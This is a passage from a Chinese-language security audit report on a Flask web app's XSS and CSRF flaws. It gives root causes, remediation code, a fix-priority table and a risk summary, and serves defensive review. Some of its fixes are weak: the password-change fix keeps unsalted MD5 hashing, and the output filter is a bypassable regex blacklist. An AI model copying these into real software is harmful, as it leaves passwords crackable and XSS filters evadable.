| **本系统风险等级** | 🟡 中危（Jinja2 防护） | 🔴 紧急（完全无防护） |

---

## 五、漏洞根因分析

| 漏洞编号 | 根因 | 不安全代码 |
|:-------:|------|-----------|
| 漏洞 1 | 用户输入直接存储到 DB，回显时仅依赖 Jinja2 auto-escape | `row[1]` 直接输出搜索结果 |
| 漏洞 2 | URL 参数直接传入模板渲染，无服务端过滤 | `msg = request.args.get("msg", "")` |
| 漏洞 3 | 前端 JS 直接操作 DOM，`prompt()` 输入通过 `location.href` 拼接 | `onclick` 中的 `location.href` 赋值 |
| 漏洞 4 | 全站 POST 接口无 CSRF Token，修改密码无需原密码且无身份校验 | `/change-password` 无 Token + 无原密码校验 |
| 漏洞 5 | 充值接口无 CSRF Token | `/recharge` 无 Token 校验 |
| 漏洞 6 | 上传接口无 CSRF Token | `/upload` 无 Token 校验 |
| 漏洞 7 | GET 方法用于修改状态操作 | `session.clear()` 在 GET 中调用 |
| 漏洞 8 | 全栈设计未考虑 CSRF 防护机制 | 所有 POST 路由均无 Token 生成/校验 |
| 漏洞 9 | Token 未与 Session 绑定/无一次性/无过期 — Token 形同虚设 | Token 生成后不校验归属、不标记已用、不限有效期 |

---

## 六、修复方案

### 6.1 CSRF Token 中间件（推荐 — 统一修复全部 CSRF 漏洞）

```python
# 在 app.py 中添加 CSRF Token 生成与校验
import secrets
import time

# [修复漏洞9] Token 配置：绑定 Session + 一次性使用 + 过期时间
CSRF_TOKEN_EXPIRE = 1800  # Token 有效期 30 分钟
CSRF_TOKEN_MAX_AGE = 3600 # Token 最大使用窗口 1 小时

@app.before_request
def generate_csrf_token():
    if request.method == "GET" and not request.path.startswith("/static"):
        if "csrf_token" not in session:
            session["csrf_token"] = secrets.token_hex(32)
            session["csrf_token_time"] = time.time()


def validate_csrf():
    """[修复漏洞9] 校验 CSRF Token — 绑定 Session + 一次性 + 过期校验"""
    if request.method == "POST":
        token = request.form.get("csrf_token", "")
        stored_token = session.get("csrf_token", "")
        token_time = session.get("csrf_token_time", 0)

        # 校验1：Token 非空
        if not token:
            return abort(400, "CSRF Token 缺失")

        # 校验2：Token 与 Session 绑定（修复漏洞9 — 防止跨用户复用）
        if token != stored_token:
            return abort(400, "CSRF Token 无效")

        # 校验3：Token 未过期（修复漏洞9 — 防止旧 Token 长期复用）
        if time.time() - token_time > CSRF_TOKEN_EXPIRE:
            return abort(400, "CSRF Token 已过期")

        # 校验4：一次性使用（修复漏洞9 — 防止相同 Token 重复提交）
        session.pop("csrf_token", None)
        session.pop("csrf_token_time", None)

    return None


# 在各模板表单中添加 CSRF Token
# <input type="hidden" name="csrf_token" value="{{ session.csrf_token }}">
```

### 6.2 各模板中的 CSRF Token 注入

```html
<!-- 在每个 <form> 中添加此行 -->
<input type="hidden" name="csrf_token" value="{{ session.csrf_token }}">
```

受影响表单：
- `profile.html`：充值表单、修改密码表单
- `upload.html`：上传表单
- `login.html`：登录表单
- `register.html`：注册表单

### 6.3 SameSite Cookie 属性配置

```python
# app.py
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'  # 或 'Lax'
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True  # 生产环境启用 HTTPS 时
```

### 6.4 XSS 加固 — 内容安全策略（CSP）头

```python
@app.after_request
def add_csp_header(response):
    """添加 CSP 安全头，进一步加固 XSS 防御"""
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; "
        "object-src 'none'; "
        "frame-ancestors 'none';"
    )
    return response
```

### 6.5 XSS 加固 — `msg` 和 `error` 参数增加服务端过滤

```python
import re

def sanitize_output(text):
    """过滤危险 HTML 标签（双重保障）"""
    if not text:
        return text
    # 移除 script 标签及事件处理器
    text = re.sub(r'<script[^>]*>.*?</script>', '', text, flags=re.IGNORECASE | re.DOTALL)
    text = re.sub(r'\bon\w+\s*=', ' disabled_=', text, flags=re.IGNORECASE)
    text = re.sub(r'javascript\s*:', 'disabled:', text, flags=re.IGNORECASE)
    return text
```

### 6.6 修改密码 API 增加原密码校验

```python
@app.route("/change-password", methods=["POST"])
def change_password():
    if not session.get("username"):
        return redirect("/login")

    # [修复] 从 session 获取当前用户
    login_username = session.get("username")
    
    old_password = request.form.get("old_password", "")
    new_password = request.form.get("new_password", "")

    # [修复] 校验原密码
    old_hashed = hashlib.md5(old_password.encode()).hexdigest()
    if USERS.get(login_username, {}).get("password") != old_hashed:
        return "原密码错误", 403

    # [修复] 禁止修改他人密码 — 从 session 取用户
    hashed = hashlib.md5(new_password.encode()).hexdigest()
    USERS[login_username]["password"] = hashed
    ...
```

### 6.7 `/logout` 改为 POST 方法

```python
@app.route("/logout", methods=["POST"])
def logout():
    session.clear()
    return redirect("/")
```

### 6.8 修复优先级

| 优先级 | 漏洞编号 | 修复内容 | 预估耗时 |
|:-----:|:--------:|---------|:-------:|
| **P0 紧急** | 4, 8, 9 | 全站增加 CSRF Token 机制 + Token 绑定 Session + SameSite Cookie | 30 分钟 |
| **P0 紧急** | 4 | 修改密码增加原密码校验 + session 用户校验 | 10 分钟 |
| **P1 重要** | 5, 6 | 充值/上传接口添加 CSRF Token（随 P0 修复） | — |
| **P1 重要** | 7 | `/logout` 改为 POST 方法 | 5 分钟 |
| **P2 一般** | 1, 2 | `msg`/`error`/`keyword` 增加服务端过滤 | 10 分钟 |
| **P2 一般** | 3, 9 | DOM XSS 审计加固 + CSP 头 + Token 一次性绑定审计 | 15 分钟 |

---

## 七、审计总结

### 7.1 安全现状总评

本次审计发现 **9 项安全缺陷**，其中 **紧急 4 项（CSRF）**、**高危 2 项（CSRF + DOM XSS）**、**中危 3 项（XSS）**。

**CSRF 风险等级显著高于 XSS**。当前系统全站无 CSRF Token 机制，任意 POST 接口均可被第三方网站跨站调用。最严重的是 `/change-password` 接口，它不仅无 CSRF 防护、无需原密码、且允许登录用户修改任意用户密码——三个设计缺陷叠加，构成一条从钓鱼邮件到管理员账户被完全接管的完整攻击链。

**XSS 风险相对可控**，因为 Jinja2 模板引擎默认启用 auto-escaping，基础的 `<script>` 注入会被自动转义。但 DOM 型 XSS（漏洞 3）发生在前端客户端，完全绕过服务端防御，是 XSS 中最值得关注的攻击向量。

### 7.2 XSS 与 CSRF 风险矩阵

| 风险维度 | XSS | CSRF |
|---------|:---:|:----:|
| 当前可利用性 | 受限（auto-escape） | **高（完全可利用）** |
| 潜在危害 | 高 | **极高** |
| 攻击成本 | 低 | **极低（仅需 HTML 页面）** |
| 系统防御 | 1 层（Jinja2） | **0 层** |
| 合规风险 | 中 | **高** |

### 7.3 核心建议

1. **P0 立即修复 CSRF**：全站增加 CSRF Token 机制（6.1 节代码可直接使用）
2. **P0 Token 绑定 Session+一次性使用**：Token 必须与用户 Session 唯一绑定、每次验证后标记已用、设置合理过期时间（15-30 分钟）
3. **P0 修复修改密码接口**：增加原密码校验、session 用户一致性校验
4. **P0 配置 SameSite Cookie**：`app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'`
5. **P1 增加 CSP 头**：内容安全策略是 XSS 防御的最后一道防线
6. **P2 增加服务端输出过滤**：URL 参数虽已由 Jinja2 转义，增加服务端过滤形成纵深防御
